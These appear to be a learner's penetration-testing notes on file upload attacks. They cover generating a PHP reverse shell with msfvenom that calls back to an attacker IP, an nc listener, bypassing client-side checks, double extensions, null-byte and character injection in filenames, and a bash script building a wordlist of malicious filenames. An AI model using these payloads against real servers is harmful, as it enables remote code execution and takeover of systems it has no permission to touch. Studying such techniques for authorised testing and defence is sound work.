

PHP Reverse Shell Repository : https://github.com/pentestmonkey/php-reverse-shell

> While running the above reverse shell, we need to start the Netcat Listener : `nc -lvnp OUR_PORT`

Generating Custom Reverse Shell : `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`

## Client Side Validation
Use Burp Suite, on the front end, add a PNG File and then intercept this request and try to change the filename and add the payload in the body.

![[Pasted image 20250416175605.png]]

We can also remove the checkFile function present in the HTML, that would remove the Client Side Validation.

## Blacklisting Filters
**Fuzzing Extensions :**  To know what all files extensions are allowed we can simply use the BurpSuite and put a wordlist for it provided by Seclist.
![[Pasted image 20250416180959.png]]

## Whitelisting Filters
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

If a web-server is using Filters like this, then we know here it is using Regex to check for the file type and we can surely trick the server for the file type.

## Double Extensions
The code only tests whether the file name contains an image extension; a straightforward method of passing the regex test is through `Double Extensions`. For example, if the `.jpg` extension was allowed, we can add it in our uploaded file name and still end our filename with `.php` (e.g. `shell.jpg.php`), in which case we should be able to pass the whitelist test, while still uploading a PHP script that can execute PHP code.
![[Pasted image 20250417125619.png]]

And if the Regex Pattern is something like this : 
```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```
Then we can't use the above method.

## Character Injection
We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.

The following are some of the characters we may try injecting:

- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (`shell.php%00.jpg`) works with PHP servers with version `5.X` or earlier, as it causes the PHP web server to end the file name after the (`%00`), and store it as (`shell.php`), while still passing the whitelist. The same may be used with web applications hosted on a Windows server by injecting a colon (`:`) before the allowed file extension (e.g. `shell.aspx:.jpg`), which should also write the file as (`shell.aspx`). Similarly, each of the other characters has a use case that may allow us to upload a PHP script while bypassing the type validation test.

**Custom Wordlist Bash Script**
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```
This will create a custom wordlist and then we can add that into the BurpSuite.

